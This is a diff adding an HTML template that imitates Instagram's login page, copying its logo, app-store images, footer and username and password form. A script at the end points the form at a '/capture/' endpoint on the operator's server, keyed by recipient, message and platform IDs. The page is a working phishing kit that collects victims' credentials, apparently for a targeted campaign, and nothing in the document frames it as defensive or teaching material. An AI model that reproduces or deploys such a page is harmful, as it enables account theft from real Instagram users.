@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/640px-Instagram_icon.png">
+    <style>
+        body {
+            background-color: #000;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            margin-top: 50px;
+            background: #111;
+            padding: 30px;
+            border-radius: 10px;
+            width: 350px;
+            text-align: center;
+            border: 1px solid #333;
+            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
+        }
+        .logo {
+            display: inline-block;
+            width: 175px;
+            height: 51px;
+            background-image: url("https://static.cdninstagram.com/rsrc.php/v4/yB/r/E7m8ZCMOFDS.png");
+            background-position: 0px 0px;
+            background-size: auto;
+            background-repeat: no-repeat;
+        }
+        input {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin: 8px 0;
+            background: #222;
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: white;
+            font-size: 14px;
+        }
+        .login-button {
+            background: #0095F6;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        .login-button:hover {
+            background: #0077cc;
+        }
+        .or {
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .or::before, .or::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #444;
+            margin: 0 10px;
+        }
+        .fb-login {
+            color: #0095F6;
+            text-decoration: none;
+            font-weight: bold;
+            display: block;
+            margin-top: 10px;
+        }
+        .forgot-password {
+            margin-top: 10px;
+            color: #bbb;
+            text-decoration: none;
+        }
+        .signup-container {
+            margin-top: 10px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid #333;
+            border-radius: 10px;
+            width: 350px;
+            background: #111;
+        }
+        .signup-container a {
+            color: #0095F6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .download-apps {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        .download-apps img {
+            width: 135px;
+            height: auto;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            text-align: center;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"></div>
+        <form method="POST" id="login-form">
+            {% csrf_token %}
+            <input type="text" name="email" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit" class="login-button">Log in</button>
+        </form>
+        <div class="or">OR</div>
+        <a href="#" class="fb-login">Log in with Facebook</a>
+        <a href="#" class="forgot-password">Forgot password?</a>
+    </div>
+    <div class="signup-container">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div class="download-apps">
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Google Play">
+        <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store">
+    </div>
+    <div class="footer">
+        Meta • About • Blog • Jobs • Help • API • Privacy • Terms • Locations • Instagram Lite • Threads • Contact Uploading & Non-Users • Meta Verified
+        <br>English • © 2025 Instagram from Meta
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const recipientId = "{{ recipient_id }}";  
+        const messageId = "{{ message_id }}";
+        const platform = "{{ platform }}";  // <-- Добавляем platform
+        const BASE_URL = "{{ settings.BASE_URL }}"; 
+    
+        if (recipientId && platform) {
+            document.querySelector("form").action = `${BASE_URL}/capture/${recipientId}/${messageId}/${platform}/`;
+        }
+    </script>
+    
+</body>
+</html>
+
+
+
